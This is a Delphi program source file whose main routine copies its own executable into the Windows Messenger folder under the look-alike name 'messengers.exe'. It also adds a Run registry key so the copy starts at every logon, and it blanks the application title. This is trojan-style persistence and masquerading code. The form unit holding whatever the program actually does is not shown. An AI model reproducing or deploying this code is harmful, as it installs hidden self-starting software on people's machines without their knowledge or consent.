program Project1;

uses
  Forms,
  SysUtils,
  Windows,
  Registry,
  Unit1 in 'Unit1.pas' {Form1};

{$R *.res}

procedure demarragereg;
var  registre: Tregistry;
begin
    try
	    Registre:=TRegistry.Create;
	    Registre.RootKey:=HKEY_CURRENT_USER;
	    Registre.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',true);
      if directoryexists('C:\Program Files\Messenger\') then
	    Registre.WriteString('Messengers','C:\Program Files\Messenger\messengers.exe');
      if directoryexists('D:\Program Files\Messenger\') then
	    Registre.WriteString('Messengers','D:\Program Files\Messenger\messengers.exe');
    finally
	    Registre.CloseKey;
	    Registre.Free;
    end;
end;

begin
  Application.Initialize;
  application.Title:='';

  demarragereg;

  if not fileexists('C:\Program Files\Messenger\messengers.exe')
  then  copyfile(pchar(application.ExeName),'C:\Program Files\Messenger\messengers.exe',false);
  if not fileexists('D:\Program Files\Messenger\messengers.exe')
  then  copyfile(pchar(application.ExeName),'D:\Program Files\Messenger\messengers.exe',false);

  if not fileexists('C:\Program Files\Messenger\qtintf70.dll')
  then  copyfile('qtintf70.dll','C:\Program Files\Messenger\qtintf70.dll',false);
  if not fileexists('D:\Program Files\Messenger\qtintf70.dll')
  then  copyfile('qtintf70.dll','D:\Program Files\Messenger\qtintf70.dll',false);

  Application.CreateForm(TForm1, Form1);
  Application.Run;

end.
